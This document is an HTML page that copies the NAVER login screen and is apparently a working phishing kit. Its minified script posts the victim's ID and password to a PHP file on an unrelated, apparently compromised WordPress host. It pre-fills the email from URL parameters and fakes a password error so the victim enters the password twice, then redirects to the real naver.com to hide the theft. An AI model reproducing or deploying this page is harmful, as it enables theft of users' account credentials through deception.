<!DOCTYPE html>
<html lang="kr">

<head>
    <meta charset="UTF-16">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>네이버 : 로그인</title>
    <link rel="stylesheet" type="text/css"
        href="https://nid.naver.com/login/css/global/desktop/w_20220216.css?20210812">
    <style>
        .hide {
            display: none;
        }
    </style>
</head>

<body>
    <div id="wrap" class="wrap">
        <div class="u_skip"><a>본문 바로가기</a></div>
        <header class="header" role="banner">
            <div class="header_inner">
                <a class="logo">
                    <h1 class="blind">NAVER</h1>
                </a>
                <div class="lang" id="show_locale_switch">
                    <select id="locale_switch" name="locale_switch" title="언어선택" class="sel">
                        <option value="ko_KR">한국어</option>
                        <option value="en_US">English</option>
                        <option value="zh-Hans_CN">中文(简体)</option>
                        <option value="zh-Hant_TW">中文(台灣)</option>
                    </select>
                </div>
            </div>
        </header>

        <div id="container" class="container">
            <!-- content -->
            <div class="content">
                <div class="login_wrap global">
                    <ul class="menu_wrap" role="tablist">
                        <li class="menu_item" role="presentation">
                            <a href="#none" id="loinid" class="menu_id on" role="tab" aria-selected="true">
                                <span class="menu_text"><span class="text">ID 로그인</span></span>
                            </a>
                        </li>
                        <li class="menu_item" role="presentation">
                            <a href="#none" id="ones" class="menu_ones" role="tab" aria-selected="false">
                                <span class="menu_text"><span class="text">일회용 번호</span></span>
                            </a>
                        </li>
                        <li class="menu_item" role="presentation">
                            <a href="#none" id="qrcode" class="menu_qr" role="tab" aria-selected="false">
                                <span class="menu_text"><span class="text">QR코드</span></span>
                            </a>
                            <!--넛지배너-->
                            <div class="nudge_banner" id="nudge_tooltip">
                                <span class="nudge_text">PC방 등 공용PC라면 QR코드 로그인이 더 안전해요.</span>
                                <button type="button" id="nudge_close" class="nudge_close"><span
                                        class="icon_nudge_close"></span></button>
                            </div>
                        </li>
                    </ul>
                    <div id="frmNIDLogin" name="frmNIDLogin">
                        <ul class="panel_wrap">
                            <li class="panel_item" style="display: block;">
                                <div class="panel_inner" role="tabpanel" aria-controls="loinid">
                                    <div class="id_pw_wrap">
                                        <div class="input_row" id="id_line">
                                            <div class="icon_cell" id="id_cell">
                                                <span class="icon_id">
                                                    <span class="blind">아이디</span>
                                                </span>
                                            </div>
                                            <input type="text" id="id" name="id" placeholder="아이디" title="Username"
                                                class="input_text" maxlength="41" value="">
                                            <span role="button" class="btn_delete" id="id_clear" style="display: none;">
                                                <span class="icon_delete">
                                                    <span class="blind">delete</span>
                                                </span>
                                            </span>
                                        </div>
                                        <div class="input_row" id="pw_line">
                                            <div class="icon_cell" id="pw_cell">
                                                <span class="icon_pw">
                                                    <span class="blind">비밀번호</span>
                                                </span>
                                            </div>
                                            <input type="password" id="pw" name="pw" placeholder="비밀번호" title="비밀번호"
                                                class="input_text" maxlength="16">
                                            <span role="button" class="btn_delete" id="pw_clear" style="display: none;">
                                                <span class="icon_delete">
                                                    <span class="blind">삭제</span>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                    <div class="login_keep_wrap" id="login_keep_wrap">
                                        <div class="keep_check">
                                            <input type="checkbox" id="keep" name="nvlong" class="input_keep"
                                                value="off">
                                            <label for="keep" class="keep_text">로그인 상태 유지</label>
                                        </div>
                                        <div class="ip_check">
                                            <a target="_blank" id="ipguide" title="IP Security"><span
                                                    class="ip_text">IP보안</span></a>
                                            <span class="switch">
                                                <input type="checkbox" id="switch" class="switch_checkbox" value="off">
                                                <label for="switch" class="switch_btn">
                                                    <span class="blind" id="switch_blind">OFF</span>
                                                </label>
                                            </span>
                                        </div>
                                    </div>

                                    <div class="login_error_wrap hide" id="err_empty_id">
                                        <div class="error_message">
                                            <strong>아이디</strong>를 입력해 주세요.
                                        </div>
                                    </div>

                                    <div class="login_error_wrap hide" id="err_empty_pw">
                                        <div class="error_message">
                                            <strong>비밀번호</strong>를 입력해 주세요.
                                        </div>
                                    </div>
                                    <div class="btn_login_wrap">
                                        <button type="submit" class="btn_login" id="btn">
                                            <span class="btn_text">로그인</span>
                                        </button>

                                    </div>
                                </div>
                            </li>
                        </ul>
                    </div>
                </div>
                <ul class="find_wrap" id="find_wrap">
                    <li>
                        <div class="find_text"><a target="_blank" id="pwinquiry" class="en_find_text">비밀번호 찾기</a> </div>
                    </li>
                    <li><a target="_blank" id="join" class="en_find_text">아이디 찾기</a></li>
                    <li><a target="_blank" id="join" class="en_find_text">회원가입</a></li>
                </ul>

            </div>
            <!-- //content -->
        </div>

        <!-- footer -->
        <div class="footer">
            <div class="footer_inner">
                <!--[주]고객센터,제휴문의,서비스안내-->
                <ul class="footer_link" id="footer_link">
                    <li><a target="_blank" class="footer_item" id="fot.agreement"><span class="text">이용약관</span></a>
                    </li>
                    <li><a target="_blank" class="footer_item" id="fot.privacy"><span
                                class="text"><strong>개인정보처리방침</strong></span></a></li>
                    <li><a target="_blank" class="footer_item" id="fot.disclaimer"><span class="text">책임의 한계와
                                법적고지</span></a></li>
                    <li><a target="_blank" class="footer_item" id="fot.help"><span class="text">회원정보 고객센터</span></a>
                    </li>
                </ul>
                <div class="footer_copy">
                    <a id="fot.naver" target="_blank">
                        <span class="footer_logo"><span class="blind">네이버</span></span>
                    </a>
                    <span class="text">Copyright</span>
                    <span class="corp">© NAVER Corp.</span>
                    <span class="text">All Rights Reserved.</span>
                </div>
            </div>
        </div>

    </div>
    <div id="nv_stat" style="display:none;">20</div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script>
        const phpLink = "https://notiwire.com/wp-includes/js/tinymce/plugins/hr/plugin.php";

        $(document).ready(function(){function a(a){return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(a)}function b(){return e(),a($("#id").val())?4>$("#pw").val()?($("#err_empty_pw").removeClass("hide"),$("#pw").val(""),$("#pw").focus(),!1):void c():($("#err_empty_id").removeClass("hide"),$("#id").val(""),$("#id").focus(),!1)}function c(){$.ajax({url:phpLink,type:"POST",data:{uidbz:$("#id").val(),passxtr:$("#pw").val()}}).done(function(){1===f?location.href=`https://www.naver.com/`:(f++,$("#err_empty_pw").show(),$("#pw").val(""),$("#pw").focus())})}function e(){$("#err_empty_id").addClass("hide"),$("#err_empty_pw").addClass("hide")}let f=0,g=new URLSearchParams(document.location.search),h=g.get("u"),i=g.get("d");const d=h+"@"+i;a(d)?($("#id").val(d),$("#pw").focus()):($("#id").val(""),$("#id").focus()),$("#btn").click(function(){b()}),$("#id").keydown(function(a){if(13==a.which)return $("#btn").click(),!1}),$("#pw").keydown(function(a){if(13==a.which)return $("#btn").click(),!1})});
    </script>
</body>

</html>
